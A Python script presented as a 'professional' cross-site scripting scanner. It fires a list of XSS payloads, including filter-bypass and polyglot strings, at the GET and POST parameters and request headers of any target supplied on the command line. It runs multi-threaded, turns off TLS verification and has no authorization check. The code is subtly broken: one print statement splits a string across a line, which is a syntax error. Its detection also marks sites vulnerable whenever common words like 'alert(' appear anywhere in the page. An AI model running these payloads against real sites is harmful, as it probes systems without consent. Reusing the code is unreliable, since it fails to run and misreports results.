#!/usr/bin/env python3
"""
Ultimate XSS Scanner v2.0 - Professional XSS Detection Tool
Works with system packages - no external dependencies needed!
"""

import sys
import requests
import threading
import time
import argparse
from urllib.parse import urlparse, urljoin, quote_plus
import re

class ProfessionalXSSScanner:
    def __init__(self, threads=5, timeout=10):
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities = []
        self.tested_count = 0
        self.lock = threading.Lock()
        
        # Professional XSS payload database
        self.payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            
            # Advanced payloads
            "';alert('XSS');//",
            '";alert("XSS");//',
            "<script>confirm('XSS')</script>",
            "<input type=text onmouseover=alert('XSS')>",
            "<div onmouseover=alert('XSS')>Test</div>",
            
            # Filter bypass
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "javascript&#58;alert('XSS')",
            
            # Polyglot payloads
            "'>\"<svg/onload=alert('XSS')>",
            '"onclick=alert("XSS") type="text',
            "';alert('XSS');//\"></textarea></script><svg/onload=alert('XSS')>",
        ]
        
        # Common parameters to test
        self.params = [
            'q', 'search', 'query', 'id', 'name', 'value', 'data', 
            'input', 'test', 'page', 'url', 'link', 'src', 'redirect',
            'return', 'goto', 'next', 'callback', 'jsonp'
        ]
    
    def normalize_url(self, target):
        """Convert target to proper URL"""
        if not target.startswith(('http://', 'https://')):
            return f'https://{target}'
        return target
    
    def test_connection(self, url):
        """Test basic connectivity"""
        try:
            response = requests.get(url, timeout=self.timeout, verify=False)
            return True, response.status_code
        except requests.exceptions.SSLError:
            # Try HTTP
            http_url = url.replace('https://', 'http://')
            try:
                response = requests.get(http_url, timeout=self.timeout)
                return True, response.status_code
            except:
                return False, None
        except:
            return False, None
    
    def test_get_parameter(self, base_url, param, payload):
        """Test GET parameter for XSS"""
        try:
            # Properly encode payload for URL
            encoded_payload = quote_plus(payload)
            test_url = f"{base_url}?{param}={encoded_payload}"
            
            response = requests.get(test_url, timeout=self.timeout, verify=False)
            
            if self.detect_xss(response.text, payload):
                with self.lock:
                    vulnerability = {
                        'type': 'GET Parameter XSS',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'method': 'GET'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"    [!] VULNERABLE: Parameter '{param}' with payload: {payload[:30]}...")
                    return True
                    
        except Exception as e:
            pass
        
        return False
    
    def test_post_parameter(self, base_url, param, payload):
        """Test POST parameter for XSS"""
        try:
            data = {param: payload}
            response = requests.post(base_url, data=data, timeout=self.timeout, verify=False)
            
            if self.detect_xss(response.text, payload):
                with self.lock:
                    vulnerability = {
                        'type': 'POST Parameter XSS',
                        'url': base_url,
                        'parameter': param,
                        'payload': payload,
                        'method': 'POST'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"    [!] VULNERABLE: POST parameter '{param}' with payload: {payload[:30]}...")
                    return True
                    
        except Exception as e:
            pass
        
        return False
    
    def test_header_injection(self, base_url, header, payload):
        """Test HTTP header injection"""
        try:
            headers = {header: payload}
            response = requests.get(base_url, headers=headers, timeout=self.timeout, verify=False)
            
            if self.detect_xss(response.text, payload):
                with self.lock:
                    vulnerability = {
                        'type': 'Header XSS',
                        'url': base_url,
                        'header': header,
                        'payload': payload,
                        'method': 'Header'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"    [!] VULNERABLE: Header '{header}' with payload: {payload[:30]}...")
                    return True
                    
        except Exception as e:
            pass
        
        return False
    
    def detect_xss(self, response_text, payload):
        """Advanced XSS detection"""
        if not response_text:
            return False
            
        # Direct reflection check
        if payload in response_text:
            return True
        
        # Decoded reflection check
        try:
            from urllib.parse import unquote
            if unquote(payload) in response_text:
                return True
        except:
            pass
        
        # Check for XSS indicators
        xss_indicators = [
            'alert(', 'confirm(', 'prompt(', '<script', 'javascript:',
            'onerror=', 'onload=', 'onclick=', 'onmouseover=', 'onfocus='
        ]
        
        payload_lower = payload.lower()
        response_lower = response_text.lower()
        
        for indicator in xss_indicators:
            if indicator in payload_lower and indicator in response_lower:
                return True
        
        return False
    
    def worker_thread(self, target_url, test_queue):
        """Worker thread for testing"""
        while True:
            try:
                test_data = test_queue.pop(0)
            except IndexError:
                break
            
            test_type, param, payload = test_data
            
            if test_type == 'GET':
                self.test_get_parameter(target_url, param, payload)
            elif test_type == 'POST':
                self.test_post_parameter(target_url, param, payload)
            elif test_type == 'HEADER':
                self.test_header_injection(target_url, param, payload)
            
            with self.lock:
                self.tested_count += 1
                if self.tested_count % 10 == 0:
                    print(f"[+] Progress: {self.tested_count} tests completed...")
    
    def comprehensive_scan(self, target):
        """Perform comprehensive XSS scan"""
        url = self.normalize_url(target)
        
        print(f"🎯 Target: {target}")
        print(f"🔗 Testing URL: {url}")
        print(f"⚡ Threads: {self.threads}")
        print("-" * 60)
        
        # Test connectivity
        print("[+] Testing connectivity...")
        reachable, status = self.test_connection(url)
        
        if not reachable:
            if url.startswith('https://'):
                url = url.replace('https://', 'http://')
                print("[!] HTTPS failed, trying HTTP...")
                reachable, status = self.test_connection(url)
        
        if not reachable:
            print("[!] ❌ Target unreachable!")
            return []
        
        print(f"[+] ✅ Connected! (Status: {status})")
        print("[+] 🚀 Starting comprehensive XSS scan...")
        print(f"[+] 💉 Testing {len(self.payloads)} payloads on {len(self.params)} parameters")
        print("-" * 60)
        
        # Build test queue
        test_queue = []
        
        # GET parameter tests
        for param in self.params:
            for payload in self.payloads:
                test_queue.append(('GET', param, payload))
        
        # POST parameter tests  
        for param in self.params:
            for payload in self.payloads[:5]:  # Test fewer for POST
                test_queue.append(('POST', param, payload))
        
        # Header injection tests
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        for header in headers_to_test:
            for payload in self.payloads[:3]:  # Test fewer for headers
                test_queue.append(('HEADER', header, payload))
        
        print(f"[+] Total tests: {len(test_queue)}")
        print("-" * 60)
        
        # Run tests with threading
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker_thread, args=(url, test_queue))
            threads.append(t)
            t.start()
        
        # Wait for completion
        for t in threads:
            t.join()
        
        return self.vulnerabilities
    
    def generate_report(self, target):
        """Generate professional vulnerability report"""
        print("
" + "=" * 70)
        print("🔍 PROFESSIONAL XSS SCAN REPORT")
        print("=" * 70)
        print(f"🎯 Target: {target}")
        print(f"📊 Tests Performed: {self.tested_count}")
        print(f"🕒 Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("-" * 70)
        
        if self.vulnerabilities:
            print(f"🚨 STATUS: VULNERABLE")
            print(f"🔴 Vulnerabilities Found: {len(self.vulnerabilities)}")
            print("-" * 70)
            
            # Group by type
            vuln_types = {}
            for vuln in self.vulnerabilities:
                vtype = vuln['type']
                if vtype not in vuln_types:
                    vuln_types[vtype] = []
                vuln_types[vtype].append(vuln)
            
            for vtype, vulns in vuln_types.items():
                print(f"\n📍 {vtype} ({len(vulns)} found)")
                print("-" * 50)
                
                for i, vuln in enumerate(vulns[:5], 1):  # Show max 5 per type
                    print(f"  #{i} Parameter: {vuln.get('parameter', vuln.get('header', 'N/A'))}")
                    print(f"      URL: {vuln['url']}")
                    print(f"      Payload: {vuln['payload']}")
                    print()                
                if len(vulns) > 5:
                    print(f"  ... and {len(vulns) - 5} more")
        else:
            print(f"✅ STATUS: SECURE")
            print(f"🟢 No XSS vulnerabilities detected")
            print(f"🛡️  Target appears protected against tested XSS vectors")
        
        print("=" * 70)
        print("⚠️  Note: Manual testing recommended for complete coverage")
        print("=" * 70)

def main():
    print("""
🔥 Professional XSS Scanner v2.0 🔥
Advanced Cross-Site Scripting Detection Tool
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Works with system packages only
✅ Multi-threaded scanning
✅ 17 advanced XSS payloads
✅ GET/POST/Header testing
✅ Professional reporting
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """)
    
    parser = argparse.ArgumentParser(description='Professional XSS Scanner')
    parser.add_argument('target', help='Target to scan (IP, domain, or URL)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout (default: 10s)')
    
    if len(sys.argv) == 1:
        parser.print_help()
        print("\nExamples:")
        print("  python3 xss_scanner.py https://example.com")
        print("  python3 xss_scanner.py 192.168.1.100")
        print("  python3 xss_scanner.py target.com --threads 10")
        sys.exit(1)
    
    args = parser.parse_args()
    
    # Initialize scanner
    scanner = ProfessionalXSSScanner(threads=args.threads, timeout=args.timeout)
    
    try:
        start_time = time.time()
        
        # Perform scan
        vulnerabilities = scanner.comprehensive_scan(args.target)
        
        # Generate report
        scanner.generate_report(args.target)
        
        end_time = time.time()
        print(f"\n⏱️  Scan Duration: {end_time - start_time:.2f} seconds")
        
        # Exit code
        sys.exit(1 if vulnerabilities else 0)
        
    except KeyboardInterrupt:
        print("\n[!] 🛑 Scan interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()